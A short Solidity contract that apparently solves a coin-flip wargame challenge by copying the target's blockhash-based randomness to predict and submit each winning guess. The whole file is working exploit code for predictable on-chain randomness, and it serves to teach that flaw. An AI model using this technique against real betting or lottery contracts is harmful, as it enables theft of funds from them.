// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
  function consecutiveWins() external view returns (uint);
}

contract CoinFlipSolver {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinFlipAddr;

  function setCoinFlipAddress(address _coinFlipContractAddr) public payable {
    coinFlipAddr = _coinFlipContractAddr;
  }

  function coinFlip() public payable {
    bool flipResult = guessResult();
    ICoinFlip(coinFlipAddr).flip(flipResult);
  }

  function getConsecutiveWins() public view returns (uint) {
    return ICoinFlip(coinFlipAddr).consecutiveWins();
  }

  function guessResult() public view returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 result = blockValue / FACTOR;
    return result == 1 ? true : false;
  }
}